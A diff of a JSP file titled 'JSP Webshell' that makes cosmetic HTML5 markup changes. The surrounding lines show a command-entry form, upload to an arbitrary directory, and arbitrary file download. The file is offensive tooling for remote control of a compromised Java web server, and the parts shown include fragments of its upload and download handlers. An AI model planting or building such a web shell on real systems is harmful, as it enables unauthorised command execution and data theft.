@@ -26,7 +26,7 @@
             fis.close();
             out.close();
         } else {
-            downloadMsg = "Error accessing file <code>" + htmlEscape(downloadFile) + "</code><br />\n";
+            downloadMsg = "Error accessing file <code>" + htmlEscape(downloadFile) + "</code><br>\n";
         }
     }
 
@@ -51,7 +51,7 @@
                     uploadDir = uploadDir.substring(0, uploadDir.length()-2);
                     uploadDir = uploadDir.length() > 0 ? uploadDir : ".";
                     if(! new File(uploadDir).canWrite()) {
-                        uploadMsg += "Cannot write to directory <code>" + htmlEscape(uploadDir) + "</code><br />\n";
+                        uploadMsg += "Cannot write to directory <code>" + htmlEscape(uploadDir) + "</code><br>\n";
                         break;
                     }
                 } else if(nextIsFile) {
@@ -60,7 +60,7 @@
                     FileOutputStream fos = new FileOutputStream(f);
                     fos.write(baos.toByteArray(), 0, baos.size()-2);
                     fos.close();
-                    uploadMsg += "Successfully uploaded <code>" + htmlEscape(fileName) + "</code> to <code>" + htmlEscape(f.getPath()) + "</code><br />\n";
+                    uploadMsg += "Successfully uploaded <code>" + htmlEscape(fileName) + "</code> to <code>" + htmlEscape(f.getPath()) + "</code><br>\n";
                 }
             } else if(nextIsContentDisposition) {
                 nextIsContentDisposition = false;
@@ -132,7 +132,7 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <meta charset="UTF-8" />
+        <meta charset="UTF-8">
         <title>JSP Webshell</title>
         <style>
             body {
@@ -153,9 +153,9 @@
         </style>
     </head>
     <body>
-        <form id="cmdForm" method="POST" action="">
-            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox" />
-            <input type="submit" value="Run" />
+        <form id="cmdForm" method="POST">
+            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" class="cmdBox">
+            <input type="submit" value="Run">
         </form>
         <div class="infoText">
 <%
@@ -181,10 +181,10 @@
             <div>
 <%= uploadMsg %>
             </div>
-            <form method="POST" action="" enctype="multipart/form-data">
-                <input type="text" name="uploadDir" placeholder="Destination folder" />
-                <input type="file" name="uploadFiles[]" multiple="multiple" />
-                <input type="submit" value="Upload" />
+            <form method="POST" enctype="multipart/form-data">
+                <input type="text" name="uploadDir" placeholder="Destination folder">
+                <input type="file" name="uploadFiles[]" multiple="multiple">
+                <input type="submit" value="Upload">
             </form>
         </div>
         <div class="featureBox">
@@ -192,9 +192,9 @@
             <div>
 <%= downloadMsg %>
             </div>
-            <form method="POST" action="">
-                <input type="text" name="downloadFile" placeholder="File to download" />
-                <input type="submit" value="Download" />
+            <form method="POST">
+                <input type="text" name="downloadFile" placeholder="File to download">
+                <input type="submit" value="Download">
             </form>
         </div>
         <script>
